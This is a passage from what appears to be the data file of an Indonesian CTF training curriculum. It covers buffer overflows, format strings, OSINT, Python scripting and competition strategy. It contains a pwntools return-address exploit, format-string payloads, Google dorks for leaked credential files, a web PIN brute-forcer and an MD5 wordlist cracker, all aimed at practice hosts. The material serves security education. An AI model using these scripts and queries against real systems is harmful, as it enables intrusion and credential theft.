\`\`\`c
// Kode Rentan
void vulnerable_function() {
    char buffer[64];
    gets(buffer); // BAHAYA: Menerima input tanpa batas ukuran!
}
\`\`\`

Jika penyerang mengirim $64 \\text{ byte buffer} + 8 \\text{ byte SFP} + \\text{Alamat fungsi win()}$, CPU akan melompat dan mengeksekusi fungsi \`win()\` saat fungsi selesai dieksekusi!`
      },
      {
        id: '10.3',
        title: '10.3 Automasi Exploit dengan Python Pwntools',
        content: `\`\`\`python
#!/usr/bin/env python3
from pwn import *

# 1. Konfigurasi arsitektur target
context.arch = 'amd64'
# io = process('./vuln_binary')
io = remote('target.flagforge.io', 1337)

# 2. Offset padding menuju RIP (64 byte buffer + 8 byte RBP = 72)
offset = 72
win_function_address = p64(0x004011f6)

# 3. Susun payload
payload = b'A' * offset + win_function_address

# 4. Kirim payload
io.sendlineafter(b'Enter your payload:', payload)
io.interactive()
\`\`\``
      },
      {
        id: '10.4',
        title: '10.4 Format String Vulnerability',
        content: `Terjadi ketika fungsi seperti \`printf(user_input)\` dipanggil tanpa format specifier (\`printf("%s", user_input)\`).

### Dampak:
- **Leak Data Stack**: Mengirim input \`%p.%p.%p.%p\` mencetak isi register dan stack pointer.
- **Arbitrary Memory Read**: \`%s\` membaca string dari alamat memori yang ditunjuk stack.
- **Arbitrary Memory Write**: \`%n\` menuliskan jumlah byte yang telah dicetak ke alamat memori tujuan.`
      }
    ]
  },

  // ==========================================
  // BAB 11: OSINT (OPEN SOURCE INTELLIGENCE)
  // ==========================================
  {
    id: 'osint',
    chapterNumber: 11,
    title: 'OSINT: Investigasi Intelijen Sumber Terbuka',
    summary: 'Teknik pengumpulan jejak digital publik, Advanced Google Dorking, domain & infrastructure footprinting, geolokasi citra satelit, dan historical archive recon.',
    readingTimeMinutes: 14,
    practiceChallengeIds: ['osi_01', 'osi_02'],
    sections: [
      {
        id: '11.1',
        title: '11.1 Advanced Google Dorking (Search Operators)',
        content: `Google Dorking memanfaatkan operator pencarian mesin pencari untuk menemukan informasi sensitif yang tidak sengaja terindeks:

\`\`\`text
# Mencari file konfigurasi atau backup berisi kredensial
site:target.com filetype:env | filetype:sql | filetype:log

# Menemukan direktori terbuka yang mengekspos file
intitle:"index of /" "backup" | "passwords"

# Mencari portal login administratif internal
site:target.com inurl:admin | inurl:dashboard | inurl:login
\`\`\``
      },
      {
        id: '11.2',
        title: '11.2 Domain Footprinting & SOCMINT',
        content: `Perkakas investigasi entitas digital:
- **WHOIS & DNS Record**: \`whois domain.com\` dan \`dig ANY domain.com\` untuk mencari email registrar dan history server.
- **Certificate Transparency Logs**: \`https://crt.sh/?q=%25.target.com\` untuk menemukan subdomain internal yang terdaftar di sertifikat SSL.
- **Username Enumeration**: Gunakan alat seperti **Sherlock** atau **WhatsMyName** untuk melacak apakah callsign/username target terdaftar di ratusan platform media sosial.`
      },
      {
        id: '11.3',
        title: '11.3 Geolocation & Image Intelligence (IMINT)',
        content: `Menentukan lokasi persis suatu foto diambil:
1. **Metadata EXIF**: Buka dengan ExifTool untuk membaca koordinat GPS (Latitude, Longitude).
2. **Landmark & Visual Clues**: Periksa bentuk tiang listrik, marka jalan, plat nomor kendaraan, bahasa plang toko, dan arah bayangan matahari (SunCalc).
3. **Pencarian Citra Terbalik**: Gunakan Google Lens, Yandex Visual Search, atau Bing Visual Search.`
      }
    ]
  },

  // ==========================================
  // BAB 12: SCRIPTING & AUTOMASI DENGAN PYTHON
  // ==========================================
  {
    id: 'scripting',
    chapterNumber: 12,
    title: 'Scripting & Automasi Solusi CTF dengan Python',
    summary: 'Pemanfaatan Python sebagai senjata serbaguna peretas: modul requests, socket TCP client, multi-threading, dan ekstraksi regex otomatis.',
    readingTimeMinutes: 16,
    practiceChallengeIds: ['scr_01', 'scr_02'],
    sections: [
      {
        id: '12.1',
        title: '12.1 Mengapa Python Adalah Bahasa Utama CTF?',
        content: `Python menawarkan sintaks ringkas, manipulasi biner/string yang fleksibel, dan ekosistem library keamanan siber terlengkap (\`requests\`, \`pwntools\`, \`pycryptodome\`, \`scapy\`).

\`\`\`python
# Template Cepat Brute-Force PIN Web Endpoint
import requests

url = "http://target.flagforge.io/api/verify"
for pin in range(1000, 10000):
    r = requests.post(url, json={"pin": f"{pin:04d}"})
    if "Invalid" not in r.text:
        print(f"[+] PIN Ditemukan: {pin:04d}")
        print(f"[+] Respon Server: {r.text}")
        break
\`\`\``
      },
      {
        id: '12.2',
        title: '12.2 Multithreading Solver & Socket Programming',
        content: `\`\`\`python
# Contoh Brute-Force Hashing Cepat dengan ThreadPoolExecutor
import hashlib
from concurrent.futures import ThreadPoolExecutor

target_hash = "5f4dcc3b5aa765d61d8327deb882cf99" # password

def check_word(word):
    word = word.strip()
    if hashlib.md5(word.encode()).hexdigest() == target_hash:
        print(f"[✓] Password Berhasil Dipecahkan: {word}")
        return True
    return False

with open("wordlist.txt", "r", encoding="latin-1") as f:
    with ThreadPoolExecutor(max_workers=50) as executor:
        executor.map(check_word, f)
\`\`\``
      }
    ]
  },

  // ==========================================
  // BAB 13: STRATEGI LOMBA CTF & TRIAGE SOAL
  // ==========================================
  {
    id: 'strategi',
    chapterNumber: 13,
    title: 'Strategi Lomba, Triage Soal & Manajemen Tim',
    summary: 'Metodologi pembagian peran tim, strategi alokasi waktu (time-boxing), triage soal bernilai poin tinggi, dan pembuatan write-up standar industri.',
    readingTimeMinutes: 12,
    practiceChallengeIds: ['lin_01'],
    sections: [
      {
        id: '13.1',
        title: '13.1 Triage Soal & Aturan 30 Menit (Time-Boxing)',
        content: `Saat lomba CTF 24 atau 48 jam dimulai:
1. **First Blood Hunting**: Selesaikan seluruh soal berbobot poin mudah (*Sanity Check*, Pengantar, Web basic) di jam pertama.
2. **Aturan 30 Menit**: Jika Anda mengerjakan satu soal selama 30 menit tanpa ada progres informasi baru, **BERHENTI SEJENAK** dan beralihlah ke kategori lain. Terjebak dalam *rabbit hole* adalah penyebab utama kekalahan tim.
3. **Dynamic Scoring Strategy**: Prioritaskan soal yang hanya diselesaikan oleh sedikit tim karena soal tersebut memiliki nilai poin paling tinggi.`
      },
      {
        id: '13.2',
        title: '13.2 Manajemen Kolaborasi Tim & Format Write-Up',
        content: `- Gunakan platform dokumentasi bersama seperti **CodiMD / HedgeDoc / Notion** untuk mencatat observasi dan temuan *endpoint*.
- Format Write-Up Profesional:
  1. **Judul & Kategori Soal** + Poin.
  2. **Vulnerability Summary** (1 paragraf ringkasan kelemahan).
  3. **Step-by-Step Proof of Concept (PoC)** beserta payload/skrip solver.
  4. **Flag yang didapatkan**.
  5. **Remediasi / Cara Memperbaiki Celah** (nilai tambah besar untuk portofolio).`
      }
    ]
  },

  // ==========================================
  // BAB 14: ROADMAP KARIER & PLATFORM LATIHAN
  // ==========================================
  {
    id: 'resources',
    chapterNumber: 14,
    title: 'Sumber Belajar, Roadmap Karier & Platform Latihan',
    summary: 'Rekomendasi platform wargames global (HackTheBox, TryHackMe, PortSwigger), sertifikasi industri keamanan siber terkemuka, dan panduan membangun portofolio profesional.',
    readingTimeMinutes: 10,
    practiceChallengeIds: ['lin_01'],
    sections: [
      {
        id: '14.1',
        title: '14.1 Platform Latihan Lanjutan (Wargames)',
        content: `Setelah menguasai kurikulum FlagForge, lanjutkan perjalanan latihan Anda ke platform berikut:

- **PicoCTF**: Platform ramah pemula yang dikelola oleh Carnegie Mellon University.
- **PortSwigger Web Security Academy**: Laboratorium Web Exploitation gratis terlengkap di dunia (dari SQLi hingga Server-Side Template Injection).
- **CryptoHack**: Platform interaktif yang fokus khusus mempelajari kriptografi modern (AES, RSA, ECC).
- **TryHackMe & Hack The Box**: Laboratorium virtual penetration testing mesin (*Boot2Root*).
- **OverTheWire (Bandit)**: Wargame wajib untuk melatih kelihaian Linux command line.`
      },
      {
        id: '14.2',
        title: '14.2 Sertifikasi Industri & Jenjang Karier',
        content: `Skill yang Anda asah di CTF membuka pintu karier bergengsi di dunia industri:

- **Penetration Tester / Ethical Hacker** (*Offensive Security*)
- **Security Operations Center (SOC) Analyst** (*Defensive Security*)
- **Vulnerability Researcher & Exploit Developer**
- **Incident Response & Digital Forensics Investigator**

### Sertifikasi Standar Industri yang Relevan:
- Level Pemula: **CompTIA Security+**, **eJPT (eLearnSecurity Junior Penetration Tester)**
- Level Profesional: **OSCP (Offensive Security Certified Professional)**, **OSWE**, **CISSP**.`
      }
    ]
  }
];
